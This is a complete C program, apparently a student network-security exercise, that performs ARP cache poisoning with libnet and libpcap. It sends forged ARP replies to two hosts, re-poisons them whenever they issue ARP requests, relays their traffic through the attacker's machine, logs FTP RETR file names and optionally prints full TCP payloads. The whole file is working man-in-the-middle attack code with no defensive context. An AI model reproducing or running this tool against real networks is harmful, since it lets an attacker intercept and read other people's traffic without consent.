#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <libnet.h>
#include <pcap.h>
#include <arpa/inet.h>		// ntohs
#include <net/ethernet.h>	// struct ether_header

typedef struct s_vars
{
	u_int32_t	ip_src;
	u_int8_t	*mac_src;
	u_int32_t	ip_target;
	u_int8_t	*mac_target;
	u_int8_t	*mac_attacker;
	libnet_t	*l;
	int			verbose;
} t_vars;

pcap_t	*g_handle;

void			get_args(int ac, char **av, t_vars *vars);
u_int8_t		*get_own_mac(libnet_t *l);
void			send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
					u_int8_t *target_mac, u_int32_t target_ip, libnet_t *l);
void			handle_signal(int signal);
pcap_t 			*open_device(char *filter_exp);
void 			packet_handler(u_char *args, 
					const struct pcap_pkthdr *packet_header,
					const u_char *packet);
const u_char	*get_payload(const u_char *packet);

int main(int ac, char **av)
{
	t_vars	vars;
	char	errbuf[LIBNET_ERRBUF_SIZE];

	vars.l = libnet_init(LIBNET_LINK, NULL, errbuf);
	if (!vars.l) {
		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
		exit(EXIT_FAILURE);
	}

	// Get ip and mac addresses
	get_args(ac, av, &vars);
	vars.mac_attacker = get_own_mac(vars.l);

	// Infect arp tables
	send_gratuitous_arp(vars.mac_attacker, vars.ip_src,
			vars.mac_target, vars.ip_target, vars.l);
	send_gratuitous_arp(vars.mac_attacker, vars.ip_target,
			vars.mac_src, vars.ip_src, vars.l);

	signal(SIGINT, handle_signal);
	printf("Listening...\n");

	// Filter: ignore packets resended from attacker
	/*char filter_str[50];*/
	/*sprintf(filter_str, "not ether src %02x:%02x:%02x:%02x:%02x:%02x",*/
			/*vars.mac_attacker[0], vars.mac_attacker[1], vars.mac_attacker[2],*/
			/*vars.mac_attacker[3], vars.mac_attacker[4], vars.mac_attacker[5]);*/
	/*g_handle = open_device(filter_str);*/
	g_handle = open_device(NULL);
	pcap_loop(g_handle, 0, packet_handler, (u_char *)&vars);

	// Disinfect arp tables
	send_gratuitous_arp(vars.mac_src, vars.ip_src,
			vars.mac_target, vars.ip_target, vars.l);
	send_gratuitous_arp(vars.mac_target, vars.ip_target,
			vars.mac_src, vars.ip_src, vars.l);

	// Clean up
	pcap_close(g_handle);
	free(vars.mac_src);
	free(vars.mac_target);
	libnet_destroy(vars.l);
}

void	get_args(int ac, char **av, t_vars *vars)
{
	int	len;

	if ((ac != 5 && ac != 6) || (ac == 6 && strcmp(av[5], "-v")))
	{
		printf("Usage: %s <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]\n", 
				av[0]);
		exit(0);
	}

	vars->ip_src = libnet_name2addr4(vars->l, av[1], LIBNET_DONT_RESOLVE);
	if (vars->ip_src == -1) {
		fprintf(stderr, "Error converting IP source address.\n");
		libnet_destroy(vars->l);
		exit(EXIT_FAILURE);
	}
	vars->mac_src = libnet_hex_aton(av[2], &len);
	if (!vars->mac_src) {
		fprintf(stderr, "Error converting MAC source address.\n");
		libnet_destroy(vars->l);
		exit(EXIT_FAILURE);
	}
	vars->ip_target = libnet_name2addr4(vars->l, av[3], LIBNET_DONT_RESOLVE);
	if (vars->ip_target == -1) {
		fprintf(stderr, "Error converting IP target address.\n");
		libnet_destroy(vars->l);
		exit(EXIT_FAILURE);
	}
	vars->mac_target = libnet_hex_aton(av[4], &len);
	if (!vars->mac_target) {
		fprintf(stderr, "Error converting MAC target address.\n");
		libnet_destroy(vars->l);
		free(vars->mac_src);
		exit(EXIT_FAILURE);
	}
	if (ac == 6)	vars->verbose = 1;
	else			vars->verbose = 0;
}

u_int8_t	*get_own_mac(libnet_t *l)
{
	struct libnet_ether_addr	*mac_addr;

	mac_addr = libnet_get_hwaddr(l);
	if (!mac_addr) {
		fprintf(stderr, "Couldn't get own IP address: %s\n",
				libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	
	return (mac_addr->ether_addr_octet);
}

void	send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
		u_int8_t *target_mac, u_int32_t target_ip, libnet_t *l)
{
	u_int8_t	mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};

	libnet_clear_packet(l);
	// Building ARP header
	if (libnet_autobuild_arp(ARPOP_REPLY, sender_mac, (u_int8_t *)(&sender_ip),
				mac_zero_addr, (u_int8_t *)(&target_ip), l) == -1)
	{
		fprintf(stderr, "Error building ARP header: %s\n", libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	// Building Ethernet header
	if (libnet_autobuild_ethernet(target_mac, ETHERTYPE_ARP, l) == -1)
	{
		fprintf(stderr, "Error building Ethernet header: %s\n",
				libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	// Writing packet
	int bytes_written;
	bytes_written = libnet_write(l);
	if (bytes_written == -1)
		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
}

void handle_signal(int signal)
{
	pcap_breakloop(g_handle);
}

pcap_t *open_device(char *filter_exp)
{
	char	*device = NULL;
	char	error_buffer[PCAP_ERRBUF_SIZE];
	pcap_t	*handle;

	// Get name device
	pcap_if_t	*alldevsp;
	int res = pcap_findalldevs(&alldevsp, error_buffer);
	if (alldevsp != NULL)
		device = alldevsp->name;
	if (res || !device)
	{
		fprintf(stderr, "Error finding device: %s\n", error_buffer);
		exit(EXIT_FAILURE);
	}
	// Open device for live capture
	handle = pcap_open_live(device, BUFSIZ, 0, -1, error_buffer);
	if (!handle)
	{
		fprintf(stderr, "Could not open device %s: %s\n", device, error_buffer);
		exit(EXIT_FAILURE);
	}
	// Filters
	if (filter_exp)
	{
		struct bpf_program filter;
		if (pcap_compile(handle, &filter, filter_exp, 0, 0) == -1)
		{
			fprintf(stderr, "Bad filter - %s\n", pcap_geterr(handle));
			exit(EXIT_FAILURE);
		}
		if (pcap_setfilter(handle, &filter) == -1)
		{
			fprintf(stderr, "Error setting filter - %s\n", pcap_geterr(handle));
			exit(EXIT_FAILURE);
		}
	}
	return (handle);
}

void packet_handler(u_char *args, const struct pcap_pkthdr *packet_header,
		const u_char *packet)
{
	t_vars *vars = (t_vars *)args;
	struct ether_header *eth_header;
	eth_header = (struct ether_header *)packet;

	if (ntohs(eth_header->ether_type) == ETHERTYPE_ARP) // If ARP packet
	{
		u_int8_t opcode = (u_int8_t)*(packet + 14 + 7);
		if (opcode == 1) // If ARP request
		{
			u_int32_t target_ip = *(u_int32_t *)(packet + 14 + 24);
			if (target_ip == vars->ip_target)
				send_gratuitous_arp(vars->mac_attacker, vars->ip_target,
						vars->mac_src, vars->ip_src, vars->l);
			if (target_ip == vars->ip_src)
				send_gratuitous_arp(vars->mac_attacker, vars->ip_src,
						vars->mac_target, vars->ip_target, vars->l);
		}
	}
	else
	{
		u_int32_t src_ip = *(u_int32_t *)(packet + 14 + 12);
		u_int32_t dst_ip = *(u_int32_t *)(packet + 14 + 16);

		// Print file name to transfer
		const u_char *payload = get_payload(packet);
		if (payload && !memcmp("RETR", payload, 4) &&
				memcmp(eth_header->ether_dhost, vars->mac_attacker, 6))
			printf("Transfering: %s\n", payload + 5);

		// Verbose option
		if (vars->verbose && payload &&
				(src_ip == vars->ip_target || src_ip == vars->ip_src))
		{
			int payload_len = packet_header->caplen - (int)(payload - packet);
			printf("%s -> %s- ", libnet_addr2name4(src_ip, LIBNET_DONT_RESOLVE),
					libnet_addr2name4(dst_ip, LIBNET_DONT_RESOLVE));
			for (int i = 0; i < payload_len; i++)
				printf("%c", payload[i]);
			printf("\n");
		}
		// Resend packet
		u_int8_t *shost = eth_header->ether_shost;
		u_int8_t *dhost = eth_header->ether_dhost;
		if (!memcmp(shost, vars->mac_src, 6)) // If from src send to target
		{
			memcpy(dhost, vars->mac_target, 6);
			memcpy(shost, vars->mac_attacker, 6);
			pcap_inject(g_handle, packet, packet_header->caplen);
		}
		else if (!memcmp(shost, vars->mac_target, 6)) // If from target to src
		{
			memcpy(dhost, vars->mac_src, 6);
			memcpy(shost, vars->mac_attacker, 6);
			pcap_inject(g_handle, packet, packet_header->caplen);
		}
	}
}

/*
 * - Ethernet header is always 14 bytes
 * - IP header length is always in a 4 byte integer at bit 4 of the IP header
 * - TCP header length is always in a 4 byte int at byte 12 of the TCP header
 */
const u_char *get_payload(const u_char *packet)
{
	struct ether_header *eth_header;
	eth_header = (struct ether_header *)packet;
	if (ntohs(eth_header->ether_type) != ETHERTYPE_IP)
		return (NULL);
	
	const u_char *ip_header;
	const u_char *tcp_header;
	const u_char *payload;

	int ip_header_len;
	int tcp_header_len;

	ip_header = packet + 14; // ethernet_header_len = 14
	ip_header_len = (*ip_header) & 0x0F;
	ip_header_len *= 4; // length store in 32-bits-segments

	if (*(ip_header + 9) != IPPROTO_TCP)
		return (NULL);

	tcp_header = ip_header + ip_header_len;
	tcp_header_len = ((*(tcp_header + 12)) & 0xF0) >> 4;
	tcp_header_len *= 4;

	payload = packet + 14 + ip_header_len + tcp_header_len;
	return (payload);
}
